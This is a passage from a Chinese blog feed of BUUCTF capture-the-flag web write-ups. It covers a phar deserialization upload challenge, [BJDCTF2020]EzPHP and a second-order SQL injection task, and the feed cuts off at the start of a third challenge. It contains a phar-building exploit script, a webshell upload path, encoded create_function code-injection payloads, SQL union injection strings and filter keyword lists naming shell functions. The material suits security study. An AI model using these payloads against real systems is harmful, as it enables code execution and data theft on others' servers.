class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看 </p><p>只要符合<code>preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)</code> <code>$file[&#39;size&#39;] &gt; 1024</code></p><p>那么我们上传的文件就会被移动到新的路径并且这个路径就是我们之前通过get传参的name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">              <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>还剩两个魔术方法</p><p>可以看到析构函数 存在eval 执行cmd属性 但是这个题目不存在反序列化入口函数</p><p>但是这个题目有文件上传啊 太经典了 phar文件搭配phar:&#x2F;&#x2F;就可以进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok 思路清晰！</p><h2 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=upload&amp;name=/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>然后上传一个一句话木马</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解:"></a>预期解:</h2><p>要想执行eval 那么 <code>$this-&gt;token != $_SESSION[&#39;user&#39;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_SESSION[&#39;user&#39;]</code>是多少呢 我们可以随便上传一个文件来看因为路径中就会爆出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689930191463-8262e26e-2d8a-4455-84c1-9ba94f9306b0.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/uploads/d13687f9a4bb80ded57226b5f42f671e/GXY845d6439be6936948e31cbfbbc90a715.txt</span><br></pre></td></tr></table></figure><p>那么<code>$_SESSION[&#39;user&#39;]=GXY845d6439be6936948e31cbfbbc90a715</code></p><p>然后就是很经典的phar链子构造 偷的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;Filename=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>-&gt;token=<span class="string">&quot;GXY845d6439be6936948e31cbfbbc90a715&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>上传上去之后 在用phar:&#x2F;&#x2F;去访问就行了 这里就不赘述了</p><p>然后这道题目过滤里有个错误</p><p> <code>if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;]))</code></p><p>仔细看<code>\.</code>前面有个空格 所以这道题匹配不到我们的<code>.</code>因而我们才能get的name中存在<code>.</code></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题(page 4)</title>
      <link href="/post/ec342723.html"/>
      <url>/post/ec342723.html</url>
      
        <content type="html"><![CDATA[<p>buu刷题(page 4)</p><span id="more"></span><h1 id="98、-BJDCTF2020-EzPH"><a href="#98、-BJDCTF2020-EzPH" class="headerlink" title="98、[BJDCTF2020]EzPH"></a>98、[BJDCTF2020]EzPH</h1><p>查看源码发现一段base32码<code>GFXEIM3YFZYGQ4A=</code> 特征是只有大写字母和数字</p><p>解码获得<code>/1nD3x.php</code></p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>和一个正则已经不可能让我们输入合法了，所以要想办法绕过这个<code>$_SERVER[&#39;QUERY_STRING&#39;]</code></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对传入的东西进行url编码，所以我们可以进行全字符url编码后传入就可以bypass。</p><p>然后是经典的换行符<code>%0a</code>绕过<code>preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) </code></p><p><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code>利用data协议写入即可</p><p><code>sha1()</code>和md5一样我们传入两个数组就会报false 从而bypass</p><p><code>$_REQUEST</code>它包含了我们get、post和cookie传入的数组，他ban掉了数字和大小写，那这里应该怎么绕过呢。</p><p> 如果get和post一样的参数名，它会优先选择post形式传入的参数的值。</p><p>所以我们可以按他的要求get传入，然后再post相同的变量名传参为数字，那么就可以bypass了</p><p>至此，我们要传入的部分为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure><p>通过url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><br></pre></td></tr></table></figure><p>这里注意一下这里符号以及数字没有被waf所以不要一键url编码了 数字和符号原样放出即可 如果一起编码，解码的时候就会出现歧义</p><p>再来看<code>extract()</code>简单说就是当我们传入一个含有键值对的数组时候，他就会帮我们把键值分别提出来键为变量名，值为变量的值。 </p><p>再来看<code>$code(&#39;&#39;, $arg)</code>这一部分，这里我们可以利用前面的extract()来改变他们的值从而利用</p><p>这里用到了create_function()匿名函数注入，之前ctfshow刷题也见到过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return $a+$b;&#x27;</span>);</span><br><span class="line">相当于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">利用sql注入的闭合思想</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>();<span class="comment">//&#125;</span></span><br><span class="line">我们可以闭合前面的&#123; 然后注释掉后面的 &#125;  再插入我们的恶意代码</span><br></pre></td></tr></table></figure><p>因此我们可以利用extract传参：<code>flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());//</code></p><p>获取当前所有变量数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">64</span>%<span class="number">65</span>]=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">5</span>f%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>e%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>]=;&#125;%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">75</span>%<span class="number">6</span>d%<span class="number">70</span>(%<span class="number">67</span>%<span class="number">65</span>%<span class="number">74</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">64</span>%<span class="number">5</span>f%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">73</span>());<span class="comment">//</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png" alt="img"></p><p>可以看到flag在 <code>rea1fl4g.php</code></p><p>但是直接访问无结果，所以还得通过伪协议配合文件包含去读</p><p> 看别人wp都是说因为禁用了include所以用require，但是我看源码没有禁include并且也用不了？？</p><p>然后<code>$code</code>单双引号也不能用</p><p>既然我们是get传参的所以我们也不能用数字字母所以我们就用取反利用不可见字符来输入伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</span><br><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67[%61%72%67]=;&#125;%72%65%71%75%69%72%65(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure><p>post传入：<code>debu=1&amp;file=1</code></p><p>还有一种解法是用require()去包含我们的flag文件 rea1fl4g.php  </p><p>然后再用 <code>var_dump(get_defined_vars()</code>去读</p><p>但是这里我们的<code>.</code>被禁了 所以利用base64函数 进行bypass</p><p>最终的paylaod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&amp;debu=aqua_is_cute &amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//  </span><br></pre></td></tr></table></figure><p>post: <code>file=1&amp;debu=2  </code></p><p>当然要url编码打入</p><h1 id="99、October-2019-Twice-SQL-Injectio"><a href="#99、October-2019-Twice-SQL-Injectio" class="headerlink" title="99、October 2019 Twice SQL Injectio"></a>99、October 2019 Twice SQL Injectio</h1><p>一道根据二次注入的题目</p><p>看题目标题也知道 然后我注册了admin’ 发现他登录后显示的语句不正常输出了 怀疑就是登录名存在二次注入</p><p> 然后注册<code>admin&#39; union select database()#</code>发现爆出了库名</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688901679744-d25e859e-d14a-49fc-949b-1f84172e40c4.png" alt="img"></p><p>然后就是联合注入和二次注入组合拳就行了 比较简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; union select database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin&#x27;</span> union select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;ctftraining&#x27;</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin&#x27;</span> union select flag <span class="keyword">from</span> flag <span class="comment">#</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><h1 id="100、-HFCTF2020-JustEscape"><a href="#100、-HFCTF2020-JustEscape" class="headerlink" title="100、[HFCTF2020]JustEscape"></a>100、[HFCTF2020]JustEscape</h1><p>一道没有思路的学习题目 vm的沙箱逃逸</p><p>看了网上的WP 好多都是没有分析只给了payload </p><p>大概学习了一下<a 